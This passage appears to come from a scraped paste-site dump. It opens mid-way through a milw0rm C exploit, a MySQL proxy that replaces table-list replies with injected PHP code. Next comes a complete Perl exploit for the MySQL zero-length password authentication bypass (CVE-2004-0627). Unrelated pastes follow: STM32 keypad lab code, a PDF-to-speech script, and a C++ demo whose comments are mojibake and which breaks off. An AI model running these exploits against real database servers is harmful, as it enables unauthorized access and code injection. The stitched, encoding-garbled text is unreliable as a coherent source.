   (*expcode)[i++] = 5 + strlen(phpcodes) ;
   /* this is our exploite codes*/
   (*expcode)[i++] = '\\'; 
   (*expcode)[i++] = '\''; 
   (*expcode)[i++] = ';'; 
   bcopy(phpcodes,*expcode + i,strlen(phpcodes));
   i += strlen(phpcodes);
   (*expcode)[i++] = '/'; 
   (*expcode)[i++] = '*'; 
   bcopy(&my4[0],*expcode + i,5);
   
   return len;
}

/* connect to mysql server*/

int connect_mysql()
{
    int s2;
    struct sockaddr_in ina;
    struct hostent *h;
    
    h = gethostbyname(HOSTNAME);
    /* set internet address */
    bcopy(h->h_addr,(void *)&ina.sin_addr,h->h_length);
    ina.sin_family = AF_INET;
    ina.sin_port = htons(MYSQL_PORT);
    //ina.sin_zero[0]='\0';
    if((s2=socket(AF_INET,SOCK_STREAM,0)) < 0) 
  	perror(""Socket: "");
    
    if(connect(s2,(struct sockaddr *)&ina,sizeof(ina)) < 0 )
	                   perror(""connect()"");
    return s2;
}

/* listener */
int listener()
{
    int s1;
    int opt;
    struct sockaddr_in ina;

    /* set internet address */
    ina.sin_family = AF_INET;
    ina.sin_port = htons(BIND_PORT);
    ina.sin_addr.s_addr = INADDR_ANY;

    if((s1=socket(AF_INET,SOCK_STREAM,0)) < 0) 
  	perror(""Socket: "");
    
    opt = 1;
    setsockopt(s1,SOL_SOCKET, SO_REUSEADDR , (char *)&opt, sizeof(opt) );
       
    if(bind(s1,(struct sockaddr *)&ina,sizeof(ina))==-1) 
	perror(""Bind: "");
	
    if(listen(s1, 10) == -1) 
  	perror(""Listen""); 
	
   return s1;
}


int main(int argc,char* argv[])
{
	struct sockaddr_in ina1;
	int ina1_l;
	int s_daemon,s_mysql;
	size_t byte_read,byte_written;
	char *buf;
	int sc,event,n_select;
	fd_set rfds;
        struct timeval tv;	 
	int exptlen,i;
	char *expt;
	char *dbname=DATABASE;
	
	buf = (char*) malloc(sizeof(char) * (BUFFER_LEN));
	tv.tv_sec  = 15;
	tv.tv_usec = 0;
	
	/* we listen to port */
	 s_daemon = listener();
    
	exptlen = build_exploite_code(dbname,phpcodes,&expt);

	for(;;) 
	{
	   fprintf(stderr,""waiting for connection\n"");
	   
	   if( -1 == (sc = accept(s_daemon,(struct sockaddr *) &ina1,&ina1_l)) ) 
		  perror(""accept()"");
	   /* if we get here, we have a new connection */
	   fprintf(stderr,""got client connection\n"");
mysql:
	   /* connect to mysql */
	   s_mysql = connect_mysql();
        
	   for(;;) 
	    {
	   	FD_ZERO(&rfds);
	        FD_SET(sc,&rfds);
  	   	FD_SET(s_mysql,&rfds);                                
		
	        n_select = (sc > s_mysql)? sc : s_mysql;

	    	event = select(n_select+1,&rfds,NULL,NULL,NULL);
	    	if(-1  == event) 
		    perror(""select()"");
	        else 
		{	
		    if(FD_ISSET(s_mysql,&rfds)) 
		     {
			byte_read = read(s_mysql,buf,BUFFER_LEN);
		    	/* check for closing client connection*/
		    	if(byte_read == 0) 
	  	        {
			   shutdown(s_mysql,SHUT_RDWR);
			   close(s_mysql);
			   goto mysql;
		        }

			 /* check data received from mysql server.
			  * if  buf[11] contain 'T', data received from   mysq server is table list
			  *
			  * NOW we replace the table with our exploite codes and send them to client
			  */
		        if( 'T' == buf[11])
			{
		           for(i=0;i<exptlen;i++) 
		              buf[i] = expt[i];
		           byte_read = exptlen;
		        }
		       
		        if(write(sc, buf, byte_read) < 0)
		           break; 
		     }
	           
	             if(FD_ISSET(sc,&rfds)) 
		     {	
	   	         byte_read = read(sc,buf,BUFFER_LEN);
		         /* check for closing client connection*/
		         if(byte_read == 0) 
		         {	
			    close(sc);    
			    break;
		         }

		       if(write(s_mysql,buf,byte_read) < 0) 
			       break; 	    
		     }    
#if defined(DEBUG)		     
		     fprintf(stderr,""data:\n"");	
		     for(i=0;i<byte_read;i++) 
			     fprintf(stderr,"" %c(%x) "",buf[i],buf[i]);
#endif    
	        }   

	    } 
	}
	free(buf);
	free(expt);
	return 0;
}

// milw0rm.com [2004-07-04]
            "
DsdTA9Hd,MySQL 4.1/5.0 - Zero-Length Password Authentication Bypass- CVE-2004-0627,FlyFar,Perl,Friday 24th of May 2024 05:38:04 AM CDT,"#!/usr/bin/perl
#
# The script connects to MySQL and attempts to log in using a zero-length password
# Based on the vuln found by NGSSecurity
#
# The following Perl script can be used to test your version of MySQL. It will display 
# the login packet sent to the server and it's reply.
# 
# Exploit copyright (c) 2004 by Eli Kara, Beyond Security
# elik beyondsecurity com
#
use strict;
use IO::Socket::INET;

usage() unless ((@ARGV >= 1) || (@ARGV <= 3));

my $username = shift(@ARGV);
my $host = shift(@ARGV);
if (!$host)
{
  usage();
}
my $port = shift(@ARGV);
if (!$port)
{
 $port = 3306; print ""Using default MySQL port (3306)\n"";
}

# create the socket
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die ""Cannot connect to host!\n"";

# receive greeting
my $reply;
recv($socket, $reply, 1024, 0);
if (length($reply) < 7)
{
 print ""Not allowed to connect to MySQL!\n"";
 exit(1);
}
print ""Received greeting:\n"";
HexDump($reply);
print ""\n"";

# here we define the login OK reply
# my $login_ok = ""\x01\x00\x00\x02\xFE"";

# break the username string into chars and rebuild it
my $binuser = pack(""C*"", unpack(""C*"", $username));

# send login caps packet with password
my $packet = ""\x85\xa6"". 
             ""\x03\x00\x00"".
    ""\x00"".
    ""\x00\x01\x08\x00\x00\x00"". # capabilities, max packet, etc..
             ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"".
             ""\x00\x00\x00\x00"".$binuser.""\x00\x14\x00\x00\x00\x00"". # username and pword hash length + NULL hash
             ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""; # continue NULL hash

substr($packet, 0, 0) = pack(""C1"", length($packet)) . ""\x00\x00\x01""; # MySQL message length + packet number (1)

print ""Sending caps packet:\n"";
HexDump($packet);
print ""\n"";
send $socket, $packet, 0;

# receive reply
recv($socket, $reply, 1024, 0);
print ""Received reply:\n"";
HexDump($reply);

my @list_bytes = unpack(""C*"", $reply);

#print ""The fifth byte is: "", $list_bytes[4], ""\n"";
if (length(@list_bytes) >= 4)
{
 print ""Response insufficent\n"";
}

#if ($reply eq $login_ok)
if ($list_bytes[4] == 0 || $list_bytes[4] == 254)
{
 print ""Received OK reply, authentication successful!!\n"";
}
else
{
 print ""Authentication failed!\n"";
}

# close
close($socket);


sub usage
{
    # print usage information
    print ""\nUsage: mysql_auth_bypass_zeropass.pl <username> <host> [port]\n
<username> - The DB username to authenticate as
<host> - The host to connect to
[port] - The TCP port which MySQL is listening on (optional, default is 3306)\n\n"";
    exit(1);
}


###
# do a hexdump of a string (assuming it's binary)
###
sub HexDump
{
 my $buffer = $_[0];

 # unpack it into chars
 my @up = unpack(""C*"", $buffer);
 my $pos=0;

 # calculate matrix sizes
 my $rows = int(@up/16);
 my $leftover = int(@up%16);

 for( my $row=0; $row < $rows ; $row++, $pos+=16)
 {
  printf(""%08X\t"", $pos);
  my @values = @up[$pos .. $pos+15];
  my @line;
  foreach my $val (@values)
  {
   push(@line, sprintf(""%02X"", $val));
  }
  print join(' ', @line), ""\n"";
 }
 # print last line
 printf(""%08X\t"", $pos);
 my @values = @up[$pos .. $pos+$leftover-1];
 my @line;
 foreach my $val (@values)
 {
  push(@line, sprintf(""%02X"", $val));
 }
 print join(' ', @line), ""\n"";
}

# milw0rm.com [2004-07-10]
            "
VkSbRM90,marfa_v3_ultimate,Bobita,C,Friday 24th of May 2024 05:18:30 AM CDT,"/*
 * USART2 is connected to the ST-Link virtual COM port.
 * Use Tera Term to interract with STM board
 *
 * By default, the clock is running at 16 MHz.
 * The UART2 is configured for 115200 Baud.
 * PA2 - USART2 TX (AF7)
 * PA3 - USART2 RX (AF7)
 */
#include ""stm32F4xx.h""
#include <stdio.h>
#include <string.h>

#include ""Types.h""
#include ""Drivers.h""

//----------------------------------------
#define RS 1    /* BIT0 mask for reg select */
#define EN 2    /* BIT1 mask for E */
#define CORRECT_PASSWORD 1234



//-------------------------------------------

int corect[4]={2,2,2,2};
	int tries=3;
	int key=0;
	int count=0;
	int k=0;



void delay(void);
void delayMs(int);
void LCD_nibble_write(char data, unsigned char control);
void LCD_command(unsigned char command);
void LCD_data(char data);
void LCD_init(void);
void SPI1_write(unsigned char data);
int readRows(void);
int getPasswordFromKeypad(void);
void outputEnableCols(char n);
void writeCols(char n);
void writeLEDs(char n);
void keypad_init(void);
char keypad_getkey(void);
void writeStringLCD(char *line);
void newLine(unsigned int size);
void stopProgram();
int len =4;
UART_MSG_T msg = {.data = {0}, .id = 0, .len = 0};
U8 CyclicMessage_U8 = 0;
U8 TimerCountDown_U16 = SECONDS_TO_COUNT_U8;
U8 PrintInCycleMode_U8 = 0;
static const U16 SPI_CR1 = 0x33F;

int parola=6;
/* Lucrarea 2 de completat */

void PeriphInit(void)
{

	__disable_irq();
	// Configure PB[7..4] as output
	RCC->AHB1ENR |= 0;			 /* Enable GPIOB clock */
	GPIOB->MODER &= 0; /* Reset GPIOB PB[7..4]  */
	GPIOB->MODER |= 0;	 /* Set GPIOB PB[7..4]  as ouput */

	// Configure PC[11..8] as input
	RCC->AHB1ENR |= 0;			 /* Enable GPIOC clock */
	GPIOC->MODER &= 0; /* Reset GPIOC PC[11..8]  for input mode */

	// Configure PB[15..12] port as input and enables pull-ups
	GPIOB->MODER &= 0; /* Reset GPIOB PB[15..12]  */
	GPIOB->PUPDR |= 0;	 /* Enable pull-ups on GPIOB PB[15..12]  */

	USART2_init();

	__enable_irq();
}

/* TODO: change the 0's to the correct value */
const U8 Hex7Segment[16] = {
	0,
	0xF9,
	0xA4,
	0xB0,
	0x99,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0,
	0};

/* end lucrarea 2*/

/* Lucrarea 3 De completat*/
static const U32 STRVR = 0;
static const U16 STCTRL = 0;

static const U16 TIM3_PSC = 0;
static const U16 TIM3_ARR = 0;

static const U16 TIM3_CH1_PSC = 0;
static const U16 TIM3_CH1_ARR = 0; 
static const U16 TIM3_CH1_CCMR1 = 0;
static const U16 TIM3_CH1_CCR1 = 0;

static const U16 TIM8_CH3_PSC = 0; 
static const U16 TIM8_CH3_CCMR2 = 0;

U32 timestamp = 0;
U32 capture_time = 0;
U8 nr_of_pushes = 0;
U8 factor = 1;
/* end lucrarea  3 */

/* Lucrarea 4 */

U16 dac_factor = 600;
U16 dac_hold_value = 0;


#define ADC_8_BIT 1 //dezactivati pentru adc 12 biti

#if ADC_8_BIT
static const U32 ADC_CR1 = 0; /* 8-bit resolution */
static const U32 ADC_CR2 = 0; /* SW Start, Align right justified, start adc */
#else 
static const U32 ADC_CR1 = 0; /* 12-bit resolution */
static const U32 ADC_CR2 = 0; /* SW Start, Align left justified,  start ADC */
#endif

static const U32 MODER = 0x000003FF; /* PA0-PA4 ca intrari analogice*/

/*End of Lucrarea 4*/

void stopProgram(){
    while(1){}
}

U8 ReceiveMessage(void)
{
	//U8 error = 0;
	char msg_str[MAX_PACKET_STR_SIZE];
	const char *pos = msg_str;

	memset(&msg, 0, sizeof(UART_MSG_T));

	fgets(msg_str, MAX_PACKET_STR_SIZE, stdin);

	// printf(""Unformated string: %s, size %d\n"", msg_str, strlen(msg_str));

	if (strlen(msg_str) < 3)
	{
		msg.id = 0xFF;
		return 0;
	}

	if (sscanf(pos, ""%2hhx"", &msg.id) == 0)
	{
		msg.id = 0xFF;
		return 0;
	}

	if (strlen(msg_str) > 5)
	{
		pos += 3;

		for (int i = 1; i < strlen(msg_str) / 3; i++)
		{
			sscanf(pos, ""%2hhx"", &msg.data[i - 1]);
			pos += 3;
			msg.len++;
		}
	}
	return 1;
}

void PrintReceivedMessage(const UART_MSG_T msg)
{
	printf(""the received packet is: \n"");
	printf(""ID: %02x \n"", msg.id);
	printf(""Size in Bytes: %d\n"", msg.len);
	printf(""Data:"");
	for (int i = 0; i < msg.len; i++)
		printf(""%02X "", msg.data[i]);
	printf(""\r\n"");
}

void ProcessMessage(const UART_MSG_T msg)
{
	U32 p;
	switch (msg.id)
	{
	case SW_VERSION:
		printf(""Current program: Lucrarea 5 SI\n"");
		break;

	case PORT_INPUT:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42 && msg.data[0] != 0x43)
		{
			printf(""bad-port\n"");
		}
		else if (((msg.data[0] == 0x42) && (msg.data[1] > 15 || msg.data[1] < 12)) ||
				((msg.data[0] == 0x43) && (msg.data[1] > 11 || msg.data[1] < 8)))
		{
			printf(""bad-pin\n"");
		}
		else
		{
			U32 i = 1;
			p = msg.data[0] != 0x42 ? GPIOC->IDR : GPIOB->IDR;
			i <<= msg.data[1];
			if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
			{
				printf(""%d \n"", (p & i) >> msg.data[1]);
				PrintInCycleMode_U8 = 0;
			}

			if (CyclicMessage_U8 == 0 && msg.len >= 3)
			{
				if (msg.data[2] > 0)
				{
					CyclicMessage_U8 = 1;
					InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
				}
			}
		}

		break;
	case PORT_OUTPUT:
		if (msg.len < 3)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42)
		{
			printf(""bad-port\n"");
		}
		else if ((msg.data[1] > 7) || (msg.data[1] < 4))
		{
			printf(""bad-pin\n"");
		}
		else
		{
			U32 i = 1;
			i <<= msg.data[1];
			GPIOB->BSRR = msg.data[2] ? (GPIOB->BSRR | i) : (GPIOB->BSRR | (i << 16));
			printf(""%02X\n"", (GPIOB->ODR & 0x000000F0) >> 4);
		}
		break;
	case PORT_HEX:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] > 3)
		{
			printf(""bad-display\n"");
		}
		else if (msg.data[1] > 15)
		{
			printf(""bad-number\n"");
		}
		else
		{

			SPI1_init();
			SPI1_write(Hex7Segment[msg.data[1]]); /* write pattern to the seven segments */
			SPI1_write(1 << msg.data[0]);		  /* select digit */
		}
		break;
	case TIMERS:
		if (msg.len < 1)
		{
			printf(""bad-len\n"");
		}
		else
		{
			SystemTickTimerStop();
			switch (msg.data[0])
			{
			/*general timer */
			case GENERAL_TIM3:
				if (CyclicMessage_U8 == 0)
				{
					TIM3_Cfg(TIM3_PSC, TIM3_ARR);
					timestamp = 0;

					if (msg.len > 1)
					{
						TIM3->ARR = ((TIM3->ARR + 1) * msg.data[1]) - 1;
						factor = msg.data[1];
					}
				}
				if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
				{
					printf(""%d \n"", timestamp);
					PrintInCycleMode_U8 = 0;
				}

				if (CyclicMessage_U8 == 0 && msg.len >= 3)
				{
					if (msg.data[2] > 0)
					{
						CyclicMessage_U8 = 1;
						InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
					}
					else
					{
						TIM3_Stop();
					}
				}
				break;
			/* out compare */
			case TIM3_CH1_COMPARE:
				TIM3_CH1_Compare_Cfg(TIM3_CH1_PSC, TIM3_CH1_ARR, TIM3_CH1_CCMR1, TIM3_CH1_CCR1);
				if (msg.len > 1)
				{
					TIM3->ARR = TIM3->ARR * msg.data[1];
				}
				break;
			/* in capture */
			case TIM8_CH3_CAPTURE:
				if (CyclicMessage_U8 == 0)
				{
					TIM8_CH3_Capture_Cfg(TIM8_CH3_PSC, TIM8_CH3_CCMR2);
					capture_time = 0;
				}

				if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
				{
					printf(""%d %d \n"", nr_of_pushes, capture_time);
					PrintInCycleMode_U8 = 0;
				}

				if (CyclicMessage_U8 == 0 && msg.len >= 2)
				{
					if (msg.data[1] > 0)
					{
						CyclicMessage_U8 = 1;
						InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
					}
					else
					{
						TIM8_Stop();
					}
				}
				break;
			/* PWM */
			case TIM8_CH1_PWM:
				StopTIM8_CH1_PWM();
				InitTIM8_CH1_PWM();
				if (msg.len >= 2)
				{
					if (msg.data[1] <= 0x64)
					{
						SetTIM8_CH1_PWM_DutyCycle(msg.data[1]);
					}
					else
					{
						printf(""bad-duty-cycle\n"");
						StopTIM8_CH1_PWM();
					}
				}
				break;
			case SYS_TICK_TIMER:
				SystemTickTimerInit(STRVR, STCTRL);
				break;
			default:
				printf(""Invalid CMD received \n"");
				break;
			}
		}
		break;
	case ADC_DAC:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if(msg.data[0] == 0x00) /*ADC*/
		{
			if(msg.data[1] > MAX_NR_OF_CHANNELS)
			{
				printf(""bad-channel\n"");
			} 
			else if (msg.data[1] < 2 || (msg.data[1] > 3 && msg.data[1] <5) || msg.data[1] > 16)
			{
				U16 adc_value = 0xFFFF;
				ADC_Configure(MODER, ADC_CR1, ADC_CR2);	
				
				adc_value = ADC_SampleChannel(msg.data[1]);
				#if ADC_8_BIT
					adc_value &= 0x00FF;
				#else
					adc_value &= 0xFFF0;
				#endif
				printf(""Channel %d value %d\n"", msg.data[1], adc_value);
				ADC_Stop();
			} 
			else {
				printf(""Channel %d value %d\n"", msg.data[1], 0xFFFF);
			}
		}
		else if(msg.data[0] == 0x01) /*DAC*/
		{
			if (CyclicMessage_U8 == 0)
			{
				dac_factor = dac_factor * msg.data[1];
				DAC_Configure(dac_hold_value + dac_factor);
			}

			if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
			{
				
				dac_hold_value = dac_hold_value + dac_factor;
				DAC->DHR12R1 = dac_hold_value & 0x0FFF;
				
				printf(""Hold Value: %d \n"", DAC->DHR12R1);
				PrintInCycleMode_U8 = 0;
			}

			if (CyclicMessage_U8 == 0)
			{
				CyclicMessage_U8 = 1;
				InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
			}
		}
		else 
		{
			printf(""Invalid module\n"");
		}
		break;
	default:
		printf(""Invalid ID received \n"");
		break;
	}
}

void citire()
{
 while(k<4)
    {
    while((key = keypad_getkey()) == 0);
    
        if(key != corect[k])
        {
             
        }
        else
        {
            ++count;
        }
        ++k;
        while(keypad_getkey() != 0);
    }
}

int main(void)
{
	U8 status = 0;

	PeriphInit();
	
  keypad_init();
	LCD_init();
	RCC->AHB1ENR |=  2;             /* enable GPIOB clock */
  GPIOB->MODER &= ~0x0000ff00;    /* clear pin mode */
  GPIOB->MODER |=  0x00005500;    /* set pins to output mode */
	
		
		
		while(1) 
			{
		LCD_data('P');
		LCD_data('A');
		LCD_data('S');
		LCD_data('S');
		LCD_data('W');
		LCD_data('O');
		LCD_data('R');
		LCD_data('D');
		LCD_data(':');
		delayMs(1000);
				if(tries>0)
				{
					citire();
					
					if(count==4)
			
					{
						 /* clear LCD display */
						LCD_command(1);
						delayMs(1000);
					
						//writeLEDs(0x0); 
						LCD_data('U');
						LCD_data('N');
						LCD_data('L');
						LCD_data('O');
						LCD_data('C');
						LCD_data('K');
						LCD_data('E');
						LCD_data('D');
						LCD_data('!');
						k=0;
					  count=0;
						//while(1);
					}
					else
					{
						 /* clear LCD display */
						LCD_command(1);
						delayMs(1000);
					
						tries--;
						LCD_data('W');
						LCD_data('R');
						LCD_data('O');
						LCD_data('N');
						LCD_data('G');
						writeLEDs(0xF);
						k=0;
					  count=0;
						delayMs(1000);
						LCD_command(1);
						citire();
					}
			}
		else
				{
			
				LCD_data('L');
        LCD_data('O');
				LCD_data('C');
				LCD_data('K');
				LCD_data('E');
				LCD_data('D');
				LCD_data('!');
				delayMs(1000);
				LCD_command(1);
				}
	}
		
}
	// incercare 2.0


//-----------------------------------------------------------------------------

/* configure SPI1 and the associated GPIO pins */
void LCD_init(void) {
    RCC->AHB1ENR |= 1;              /* enable GPIOA clock */
    RCC->AHB1ENR |= 4;              /* enable GPIOC clock */
    RCC->APB2ENR |= 0x1000;         /* enable SPI1 clock */

    /* PORTA 5, 7 for SPI1 MOSI and SCLK */
    GPIOA->MODER &= ~0x0000CC00;    /* clear pin mode */
    GPIOA->MODER |=  0x00008800;    /* set pin alternate mode */
    GPIOA->AFR[0] &= ~0xF0F00000;   /* clear alt mode */
    GPIOA->AFR[0] |=  0x50500000;   /* set alt mode SPI1 */

    /* PA12 as GPIO output for SPI slave select */
    GPIOA->MODER &= ~0x03000000;    /* clear pin mode */
    GPIOA->MODER |=  0x01000000;    /* set pin output mode */

    /* initialize SPI1 module */
    SPI1->CR1 = 0x31F;
    SPI1->CR2 = 0;
    SPI1->CR1 |= 0x40;              /* enable SPI1 module */

    /* LCD controller reset sequence */
    delayMs(20);
    LCD_nibble_write(0x30, 0);
    delayMs(5);
    LCD_nibble_write(0x30, 0);
    delayMs(1);
    LCD_nibble_write(0x30, 0);
    delayMs(1);
    LCD_nibble_write(0x20, 0);  /* use 4-bit data mode */
    delayMs(1);
    LCD_command(0x28);          /* set 4-bit data, 2-line, 5x7 font */
    LCD_command(0x06);          /* move cursor right */
    LCD_command(0x01);          /* clear screen, move cursor to home */
    LCD_command(0x0F);          /* turn on display, cursor blinking */
}

void LCD_nibble_write(char data, unsigned char control) {
    data &= 0xF0;       /* clear lower nibble for control */
    control &= 0x0F;    /* clear upper nibble for data */
    SPI1_write (data | control);           /* RS = 0, R/W = 0 */
    SPI1_write (data | control | EN);      /* pulse E */
    delayMs(0);
    SPI1_write (data);
}

void LCD_command(unsigned char command) {
    LCD_nibble_write(command & 0xF0, 0);    /* upper nibble first */
    LCD_nibble_write(command << 4, 0);      /* then lower nibble */

    if (command < 4)
        delayMs(2);         /* command 1 and 2 needs up to 1.64ms */
    else
        delayMs(1);         /* all others 40 us */
}

void LCD_data(char data) {
    LCD_nibble_write(data & 0xF0, RS);      /* upper nibble first */
    LCD_nibble_write(data << 4, RS);        /* then lower nibble */

    delayMs(1);
}

/* This function enables slave select, writes one byte to SPI1, */
/* wait for transmit complete and deassert slave select. */
void SPI1_write(unsigned char data) {
    while (!(SPI1->SR & 2)) {}      /* wait until Transfer buffer Empty */
    GPIOA->BSRR = 0x10000000;       /* assert slave select */
    SPI1->DR = data;                /* write data */
    while (SPI1->SR & 0x80) {}      /* wait for transmission done */
    GPIOA->BSRR = 0x00001000;       /* deassert slave select */
}

/* 16 MHz SYSCLK */
void delayMs(int n) {
    int i;
    for (; n > 0; n--)
        for (i = 0; i < 3195; i++) ;
}


void writeStringLCD(char *line) {
    for(unsigned int i=0; i < strlen(line); i++)
    {
        LCD_data(line[i]);
    }
}

void newLine(unsigned int size){
    for(unsigned int i=0; i < 40-size; i++)
    {
        LCD_data(' ');
    }
}

int getPasswordFromKeypad(void) {
    int password = 0;
    char key;
    for (int i = 0; i < 4; i++) {
        do {
            key = keypad_getkey();
        } while (key == 0);  /* wait for a key press */
        password = password * 10  + (key - '0');  /* assuming single digit keys */
				// btn 1 -> 0 * 10 + ( 0 - 0) = 0
				// btn 2 -> 0 * 10 + ( 1 - 0 ) = 0 + 1 = 1
				//btn 3 -> 1 * 10 + (2 - 0 ) = 10 + 2 = 12
				// btn 4 ->
        delay();  /* debounce delay */
		}
    return password;
}




char keypad_getkey(void)
{
    int row, col;

    /* check to see any key is pressed first */
    outputEnableCols(0xF);      /* enable all columns */
    writeCols(0xF);             /* and drive them high */
    delay();                    /* wait for signal to settle */
    row = readRows();           /* read all rows */
    writeCols(0x0);             /* discharge all columns */
    outputEnableCols(0x0);      /* disable all columns */
    if (row == 0) return 0;     /* if no key pressed, return a zero */

    /* If a key is pressed, it gets here to find out which key.
     * It activates one column at a time and read the rows to see
     * which is active.
     */
    for (col = 0; col < 4; col++) {
        outputEnableCols(1 << col); /* enable one column */
        writeCols(1 << col);        /* turn the active row high */
        delay();                    /* wait for signal to settle */
        row = readRows();           /* read all rows */
        writeCols(0x0);             /* discharge all columns */
        if (row != 0) break;        /* if one of the row is low, some key is pressed. */
    }

    outputEnableCols(0x0);          /* disable all columns */
    if (col == 4)
        return 0;                   /* if we get here, no key is pressed */

    /* gets here when one of the rows has key pressed.
     * generate a unique key code and return it.
     */
    if (row == 0x01) {return 0 + col;}    // key in row 0
    if (row == 0x02) {return 4 + col;  }  // key in row 1
    if (row == 0x04) {return 8 + col;   } // key in row 2
    if (row == 0x08) {return 12 + col;   }// key in row 3

    return 0;   /* just to be safe */
}

/* enable columns according to bit 3-0 of the parameter n */
void outputEnableCols(char n) {
    GPIOB->MODER &= ~0xFF000000;    /* clear pin mode */

    /* make the pin output according to n */
	if (n & 1)
		GPIOB->MODER |=  0x01000000;
    if (n & 2)
		GPIOB->MODER |=  0x04000000;
	if (n & 4)
		GPIOB->MODER |=  0x10000000;
	if (n & 1 << 3)
		GPIOB->MODER |=  0x40000000;
}

/* write columns high or low according to bit 3-0 of the parameter n */
void writeCols(char n) {
    GPIOB->BSRR = 0xF0000000;   // turn off all column pins
    GPIOB->BSRR = n << 12;      // turn on column pins
}

/* read rows and return them in bit 3-0 */
int readRows(void) {
	return (GPIOC->IDR & 0x0F00) >> 8;
}





void writeLEDs(char n) {
    GPIOB->BSRR = 0x00F00000;   // turn off all LEDs
    GPIOB->BSRR = n << 4;       // turn on LEDs
}

/* system clock at 16 MHz delay about 100 us */
void delay(void) {
	int j;

	for (j = 0; j < 300; j++)
		;      /* do nothing */
}

/* This function intializes the pins connected to the keypad. */
void keypad_init(void) {
	/* make rows input first */
    RCC->AHB1ENR |=  4;             /* enable GPIOC clock */
    GPIOC->MODER &= ~0x00FF0000;    /* clear pin mode */

	/* make columns input */
    RCC->AHB1ENR |=  2;             /* enable GPIOB clock */
    GPIOB->MODER &= ~0xFF000000;    /* clear pin mode */
}

//-----------------------------------------------------------------------------

//void delayMs(int n)
//{
//	int i;
//	for (; n > 0; n--)
//		for (i = 0; i < 3195; i++)
//		{
//			__NOP();
//		}
//}

/* ISRs */
void TIM2_IRQHandler(void)
{
	TIM2->SR = 0; /* clear UIF */
	TimerCountDown_U16--;
	PrintInCycleMode_U8 = 1; /* time to print */
}

/* Lucrarea 3*/
void TIM3_IRQHandler(void)
{
	if (TIM3->SR & 1)
	{
		TIM3->SR &=~ 1;
		timestamp += 40 * factor;
	}
}

void TIM8_CC_IRQHandler(void)
{
	if (TIM8->SR & 8)
	{
		TIM8->SR &=~ 8;
		nr_of_pushes += 1;
		capture_time += TIM8->CCR3;
	}
}

void SysTick_Handler(void)
{
	GPIOB->ODR ^= 0x00000020;
}
"
QBLt3x6h,Untitled,_fedosssss_,Python,Friday 24th of May 2024 05:17:39 AM CDT,"# Importing necessary libraries
import PyPDF2
import pyttsx3

# Prompt user for the PDF file name
pdf_filename = input(""Enter the PDF file name (including extension): "").strip()                        

# Open the PDF file
try:
    with open(pdf_filename, 'rb') as pdf_file:

        # Create a PdfFileReader object
        pdf_reader = PyPDF2.PdfReader(pdf_file)

        # Get an engine instance for the speech synthesis
        speak = pyttsx3.init()        

        # Iterate through each page and read the text
        for page_num in range(len(pdf_reader.pages)):
            page = pdf_reader.pages[page_num]
            text = page.extract_text()
            if text:
                speak.say(text)
                speak.runAndWait()       

        # Stop the speech engine
        speak.stop()      
        print(""Audiobook creation completed."")

except FileNotFoundError:
    print(""The specified file was not found."")

except Exception as e:
    print(f""An error occurred: {e}"")"
efVyUFPs,Untitled,35657,C++,Friday 24th of May 2024 05:05:31 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

template<typename container>
void print(container cont) {
    for (const auto& a : cont) {
        std::cout << a << "" "";
    }
    std::cout << std::endl;
}


int main() {

    const int MAX_SIZE = 30;

    std::vector<int> numbers{ 89, 42, 6, 14, 81, 91, 28, 64, 48, 66, 55, 17, 85, 22, 22, 63, 81, 45, 29, 67, 52, 47, 23, 98, 3, 32, 71, 53, 93, 49, 60, 88, 59, 37, 68, 55, 29, 73, 42, 45 };

    print(numbers);
   
    std::sort(numbers.begin(), numbers.end()); // —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é (–ø–æ –≤–æ–∑—Ä–∞—Å—Ç–∞–Ω–∏—é)

    print(numbers);

    // —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–º—É –∫—Ä–∏—Ç–µ—Ä–∏—é
    std::sort(numbers.begin(), numbers.end(), [](const int left, const int right) {return left > right; });

    print(numbers);


    // —Ä–∞–∑–≤–æ—Ä–æ—Ç –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
    std::reverse(numbers.begin(), numbers.end());

    print(numbers);

    // –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Ö–æ–∂–¥–µ–Ω–∏–π –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–º –¥–∏–∞–ø–∞–∑–æ–Ω–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
    std::cout << std::count(numbers.begin(), numbers.end(), 81) << std::endl;


    // –ø–æ–∏—Å–∫ —ç–ª–µ–º–µ–Ω—Ç–∞ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ
    auto it = std::find(numbers.begin(), numbers.end(), 73);

    if (it != numbers.end()) {
        *it += 1;
    }

    print(numbers);

